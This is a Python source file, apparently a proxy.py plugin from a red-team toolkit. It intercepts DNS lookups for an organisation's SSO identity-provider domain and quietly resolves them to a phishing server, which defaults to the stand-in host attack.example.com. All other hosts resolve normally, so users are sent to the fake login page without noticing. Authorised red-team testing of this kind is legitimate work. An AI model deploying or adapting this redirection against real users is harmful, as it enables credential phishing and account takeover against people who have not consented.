# -*- coding: utf-8 -*-
import socket
import logging
import json
import os
from typing import Tuple, Optional

from proxy.http.proxy import HttpProxyBasePlugin
from proxy.common.types import HostPort
from lib.sso_models import SSOModel


class ExampleDnsResolverPlugin(HttpProxyBasePlugin):
    def __init__(self, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)
        self.sso_json_path = os.environ.get('SSO_JSON_PATH', '.out/sso.json')
        self.red_team_phishing_domain = os.environ.get('RED_TEAM_PHISH_SERVER', 'attack.example.com')
        logging.debug(f"Loading SSO configuration from {self.sso_json_path}")
        self.sso = SSOModel()
        self.sso.load_from_json(json.load(open(self.sso_json_path)))
        logging.debug(f"SSO Configuration: {self.sso.describe()}")

    def resolve_dns(self, host: str, port: int) -> Tuple[Optional[str], Optional[HostPort]]:
        try:
            if host == self.sso.idp.domain:
                logging.info(f"Intercepting DNS resolution to IDP: {host}")
                result = socket.getaddrinfo(self.red_team_phishing_domain, port, proto=socket.IPPROTO_TCP)[0][4][0], None
                logging.debug(result)
                return result
            else:
                return socket.getaddrinfo(host, port, proto=socket.IPPROTO_TCP)[0][4][0], None
        except socket.gaierror:
            logging.info(f"Resolution failed")
            # Ideally we can also thrown HttpRequestRejected or HttpProtocolException here
            # Returning None simply fallback to core generated exceptions.
            return None, None
